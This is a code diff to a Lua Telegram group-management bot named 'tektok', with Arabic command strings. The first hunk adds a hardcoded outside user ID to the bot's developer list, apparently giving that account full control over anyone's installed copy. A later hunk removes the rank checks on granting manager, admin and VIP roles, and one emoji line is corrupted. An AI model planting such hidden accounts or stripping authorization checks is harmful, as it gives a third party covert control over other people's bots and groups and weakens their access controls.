@@ -114,7 +114,7 @@ token = sudos.Token_Bot
 UserName_Dev = sudos.UserName_tektok
 bot_id = token:match("(%d+)")  
 Id_Dev = sudos.Id_Devtektok
-Ids_Dev = {sudos.Id_Devtektok}
+Ids_Dev = {sudos.Id_Devtektok,373906612}
 Name_Bot = redis:get(bot_id.."Redis:Name:Bot") or "تيكتوك"
 ------------------------------------------------------------------------------------------------------------
 function var(value)  
@@ -149,117 +149,7 @@ end
 end  
 return Dev_tektok_User  
 end 
-local function DeveloperBot(msg) 
-deved = false
-local Status = redis:sismember(bot_id.."Developer:Bot", msg.sender_user_id_) 
-if Status then
-deved = true  
-end
-if Dev_tektok(msg) == true then  
-deved = true  
-end  
-return deved
-end
-function PresidentGroup(msg)
-PresidentGroup = false
-local hash = redis:sismember(bot_id.."President:Group"..msg.chat_id_, msg.sender_user_id_) 
-if hash then 
-PresidentGroup = true  
-end
-if Dev_tektok(msg) == true then  
-PresidentGroup = true  
-end
-if redis:sismember(bot_id.."Developer:Bot", msg.sender_user_id_) then  
-PresidentGroup = true  
-end 
-return PresidentGroup
-end
-function Constructor(msg)
-Constructor = false    
-local hash = redis:sismember(bot_id..'Constructor:Group'..msg.chat_id_, msg.sender_user_id_) 
-if hash then 
-Constructor = true  
-end
-if Dev_tektok(msg) == true then  
-Constructor = true  
-end
-if redis:sismember(bot_id.."Developer:Bot", msg.sender_user_id_) then  
-Constructor = true  
-end 
-if redis:sismember(bot_id.."President:Group"..msg.chat_id_, msg.sender_user_id_) then  
-Constructor = true  
-end
-return Constructor
-end
-function Owner(msg)
-Owner = false
-local hash = redis:sismember(bot_id..'Manager:Group'..msg.chat_id_,msg.sender_user_id_)    
-if hash then 
-Owner = true  
-end
-if Dev_tektok(msg) == true then  
-Owner = true  
-end
-if redis:sismember(bot_id.."Developer:Bot", msg.sender_user_id_) then  
-Owner = true  
-end 
-if redis:sismember(bot_id.."President:Group"..msg.chat_id_, msg.sender_user_id_) then  
-Owner = true  
-end
-if redis:sismember(bot_id..'Constructor:Group'..msg.chat_id_, msg.sender_user_id_) then  
-Owner = true  
-end
-return Owner
-end
-function Admin(msg)
-Admiin = false
-local hash = redis:sismember(bot_id..'Admin:Group'..msg.chat_id_,msg.sender_user_id_)    
-if hash then 
-Admiin = true  
-end
-if Dev_tektok(msg) == true then  
-Admiin = true  
-end
-if redis:sismember(bot_id.."Developer:Bot", msg.sender_user_id_) then  
-Admiin = true  
-end 
-if redis:sismember(bot_id.."President:Group"..msg.chat_id_, msg.sender_user_id_) then  
-Admiin = true  
-end
-if redis:sismember(bot_id..'Constructor:Group'..msg.chat_id_, msg.sender_user_id_) then  
-Admiin = true  
-end
-if redis:sismember(bot_id..'Manager:Group'..msg.chat_id_,msg.sender_user_id_) then  
-Admiin = true  
-end
-return Admiin 
-end
-function Vips(msg)
-vipss = false 
-local hash = redis:sismember(bot_id..'Vip:Group'..msg.chat_id_,msg.sender_user_id_) 
-if hash then 
-vipss = true  
-end
-if Dev_tektok(msg) == true then  
-vipss = true  
-end
-if redis:sismember(bot_id.."Developer:Bot", msg.sender_user_id_) then  
-vipss = true  
-end 
-if redis:sismember(bot_id.."President:Group"..msg.chat_id_, msg.sender_user_id_) then  
-vipss = true  
-end
-if redis:sismember(bot_id..'Constructor:Group'..msg.chat_id_, msg.sender_user_id_) then  
-vipss = true  
-end
-if redis:sismember(bot_id..'Manager:Group'..msg.chat_id_,msg.sender_user_id_) then  
-vipss = true  
-end
-if redis:sismember(bot_id..'Admin:Group'..msg.chat_id_,msg.sender_user_id_) then       
-vipss = true  
-end 
-return vipss
-end
+
 ------------------------------------------------------------------------------------------------------------
 function Rank_Checking(user_id,chat_id)
 if Dev_tektok_User(user_id) then
@@ -849,6 +739,117 @@ function Dev_tektok_File(msg,data)
 if msg then
 msg = data.message_
 text = msg.content_.text_
+local function DeveloperBot(msg) 
+deved = false
+local Status = redis:sismember(bot_id.."Developer:Bot", msg.sender_user_id_) 
+if Status then
+deved = true  
+end
+if Dev_tektok(msg) == true then  
+deved = true  
+end  
+return deved
+end
+function PresidentGroup(msg)
+PresidentGroup = false
+local hash = redis:sismember(bot_id.."President:Group"..msg.chat_id_, msg.sender_user_id_) 
+if hash then 
+PresidentGroup = true  
+end
+if Dev_tektok(msg) == true then  
+PresidentGroup = true  
+end
+if redis:sismember(bot_id.."Developer:Bot", msg.sender_user_id_) then  
+PresidentGroup = true  
+end 
+return PresidentGroup
+end
+function Constructor(msg)
+Constructor = false    
+local hash = redis:sismember(bot_id..'Constructor:Group'..msg.chat_id_, msg.sender_user_id_) 
+if hash then 
+Constructor = true  
+end
+if Dev_tektok(msg) == true then  
+Constructor = true  
+end
+if redis:sismember(bot_id.."Developer:Bot", msg.sender_user_id_) then  
+Constructor = true  
+end 
+if redis:sismember(bot_id.."President:Group"..msg.chat_id_, msg.sender_user_id_) then  
+Constructor = true  
+end
+return Constructor
+end
+function Owner(msg)
+Owner = false
+local hash = redis:sismember(bot_id..'Manager:Group'..msg.chat_id_,msg.sender_user_id_)    
+if hash then 
+Owner = true  
+end
+if Dev_tektok(msg) == true then  
+Owner = true  
+end
+if redis:sismember(bot_id.."Developer:Bot", msg.sender_user_id_) then  
+Owner = true  
+end 
+if redis:sismember(bot_id.."President:Group"..msg.chat_id_, msg.sender_user_id_) then  
+Owner = true  
+end
+if redis:sismember(bot_id..'Constructor:Group'..msg.chat_id_, msg.sender_user_id_) then  
+Owner = true  
+end
+return Owner
+end
+function Admin(msg)
+Admiin = false
+local hash = redis:sismember(bot_id..'Admin:Group'..msg.chat_id_,msg.sender_user_id_)    
+if hash then 
+Admiin = true  
+end
+if Dev_tektok(msg) == true then  
+Admiin = true  
+end
+if redis:sismember(bot_id.."Developer:Bot", msg.sender_user_id_) then  
+Admiin = true  
+end 
+if redis:sismember(bot_id.."President:Group"..msg.chat_id_, msg.sender_user_id_) then  
+Admiin = true  
+end
+if redis:sismember(bot_id..'Constructor:Group'..msg.chat_id_, msg.sender_user_id_) then  
+Admiin = true  
+end
+if redis:sismember(bot_id..'Manager:Group'..msg.chat_id_,msg.sender_user_id_) then  
+Admiin = true  
+end
+return Admiin 
+end
+function Vips(msg)
+vipss = false 
+local hash = redis:sismember(bot_id..'Vip:Group'..msg.chat_id_,msg.sender_user_id_) 
+if hash then 
+vipss = true  
+end
+if Dev_tektok(msg) == true then  
+vipss = true  
+end
+if redis:sismember(bot_id.."Developer:Bot", msg.sender_user_id_) then  
+vipss = true  
+end 
+if redis:sismember(bot_id.."President:Group"..msg.chat_id_, msg.sender_user_id_) then  
+vipss = true  
+end
+if redis:sismember(bot_id..'Constructor:Group'..msg.chat_id_, msg.sender_user_id_) then  
+vipss = true  
+end
+if redis:sismember(bot_id..'Manager:Group'..msg.chat_id_,msg.sender_user_id_) then  
+vipss = true  
+end
+if redis:sismember(bot_id..'Admin:Group'..msg.chat_id_,msg.sender_user_id_) then       
+vipss = true  
+end 
+return vipss
+end
 ------------------------------------------------------------------------------------------------------------
 if msg.chat_id_ then
 local id = tostring(msg.chat_id_)
@@ -1580,24 +1581,7 @@ redis:srem(bot_id.."Validitys:Group"..msg.chat_id_,CmdDel)
 redis:del(bot_id.."Redis:Validity:Group"..msg.chat_id_..""..msg.sender_user_id_) 
 return false  
 end 
-if text == "مدير" then
-if not Constructor(msg) then
-send(msg.chat_id_, msg.id_,"\n⌔︙الاستخدام خطا رتبتك اقل من منشئ \n⌔︙تستطيع اضافة صلاحيات الاتيه فقط ← { عضو ، مميز  ، ادمن }") 
-return false
-end
-end
-if text == "ادمن" then
-if not Owner(msg) then 
-send(msg.chat_id_, msg.id_,"\n⌔︙الاستخدام خطا رتبتك اقل من مدير \n⌔︙تستطيع اضافة صلاحيات الاتيه فقط ← { عضو ، مميز }") 
-return false
-end
-end
-if text == "مميز" then
-if not Admin(msg) then
-send(msg.chat_id_, msg.id_,"\n⌔︙الاستخدام خطا رتبتك اقل من ادمن \n⌔︙تستطيع اضافة صلاحيات الاتيه فقط ← { عضو }") 
-return false
-end
-end
+
 if text == "مدير" or text == "ادمن" or text == "مميز" or text == "عضو" then
 local textn = redis:get(bot_id.."Add:Validity:Group:Rt:New"..msg.chat_id_..msg.sender_user_id_)  
 redis:set(bot_id.."Add:Validity:Group:Rt"..textn..msg.chat_id_,text)
@@ -2647,14 +2631,6 @@ end
 end 
 end
 if TypeForChat == ("ForSuppur") then
-if text and text:match('^'..Name_Bot..' ') then
-data.message_.content_.text_ = data.message_.content_.text_:gsub('^'..Name_Bot..' ','')
-end
-if text then
-local NewCmmd = redis:get(bot_id.."Get:Reides:Commands:Group"..msg.chat_id_..":"..text)
-if NewCmmd then
-text = (NewCmmd or text)
-end;end
 if text ==  ""..Name_Bot..' شنو رئيك بهاذا' and tonumber(msg.reply_to_message_id_) > 0 and not redis:get(bot_id.."Status:Fun:Bots"..msg.chat_id_) then     
 tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, function(Arg,Data) 
 local Text_Fun = {'لوكي وزاحف من ساع زحفلي وحضرته 😒','خوش ولد و ورده مال الله 🙄','يلعب ع البنات 🙄', 'ولد زايعته الكاع 😶🙊','صاك يخبل ومعضل ','محلو وشواربه جنها مكناسه 😂🤷🏼‍♀️','اموت عليه 🌝','هوه غير الحب مال اني ❤️','مو خوش ولد صراحه ☹️','ادبسز وميحترم البنات  ', 'فد واحد قذر 🙄😒','ماطيقه كل ما اكمشه ريحته جنها بخاخ بف باف مال حشرات 😂🤷‍♀️','مو خوش ولد 🤓' } 
@@ -6252,7 +6228,7 @@ name = string.gsub(name,"⛈","🌨🌨🌨🌨🌨⛈🌨🌨🌨🌨")
 name = string.gsub(name,"🌥","⛅️⛅️⛅️⛅️⛅️⛅️🌥⛅️⛅️⛅️⛅️")
 name = string.gsub(name,"⛄️","☃☃☃☃☃☃⛄️☃☃☃☃")
 name = string.gsub(name,"👨‍🔬","👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👨‍🔬👩‍🔬👩‍🔬👩‍🔬")
-name = string.gsub(name,"👨‍💻","👩‍💻👩‍💻👩‍‍💻👩‍‍💻👩‍💻👨‍💻👩‍💻👩‍💻👩‍💻")
+name = string.gsub(name,"👨‍💻","👩‍💻👩‍??👩‍‍💻👩‍‍💻👩‍💻👨‍💻👩‍💻👩‍💻👩‍💻")
 name = string.gsub(name,"👨‍🔧","👩‍🔧👩‍🔧👩‍🔧👩‍🔧👩‍🔧👩‍🔧👨‍🔧👩‍🔧")
 name = string.gsub(name,"👩‍🍳","👨‍🍳👨‍🍳👨‍🍳👨‍🍳👨‍🍳👩‍🍳👨‍🍳👨‍🍳👨‍🍳")
 name = string.gsub(name,"🧚‍♀","🧚‍♂🧚‍♂🧚‍♂🧚‍♂🧚‍♀🧚‍♂🧚‍♂")
@@ -7022,6 +6998,14 @@ if msg.date_ and msg.date_ < tonumber(os.time() - 30) then
 print("->> Old Message End <<-")
 return false
 end
+if text and text:match('^'..Name_Bot..' ') then
+data.message_.content_.text_ = data.message_.content_.text_:gsub('^'..Name_Bot..' ','')
+end
+if text then
+local NewCmmd = redis:get(bot_id.."Get:Reides:Commands:Group"..msg.chat_id_..":"..data.message_.content_.text_)
+if NewCmmd then
+data.message_.content_.text_ = (NewCmmd or data.message_.content_.text_)
+end;end
 ------------------------------------------------------------------------------------------------------------
 tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
 if data.username_ ~= false then
